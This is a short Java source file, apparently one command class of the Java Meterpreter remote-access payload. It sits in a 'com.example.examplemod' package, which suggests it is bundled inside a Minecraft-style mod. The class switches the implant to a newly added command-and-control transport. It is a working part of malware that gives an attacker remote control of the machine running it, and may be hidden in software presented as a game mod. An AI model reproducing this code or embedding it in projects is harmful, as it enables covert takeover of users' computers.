package com.example.examplemod.meterpreter.core;

import com.example.examplemod.meterpreter.Meterpreter;
import com.example.examplemod.meterpreter.TLVPacket;
import com.example.examplemod.meterpreter.TLVType;
import com.example.examplemod.meterpreter.Transport;
import com.example.examplemod.meterpreter.TcpTransport;
import com.example.examplemod.meterpreter.HttpTransport;
import com.example.examplemod.meterpreter.Utils;
import com.example.examplemod.meterpreter.command.Command;

public class core_transport_change extends core_transport_add {

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        int result = super.execute(meterpreter, request, response);

        if (result == ERROR_SUCCESS) {
            // transport added as a previous element, switch it
            meterpreter.getTransports().setNext(meterpreter.getTransports().current().getPrev(), 0);
            result = EXIT_DISPATCH;
        }

        return result;
    }
}

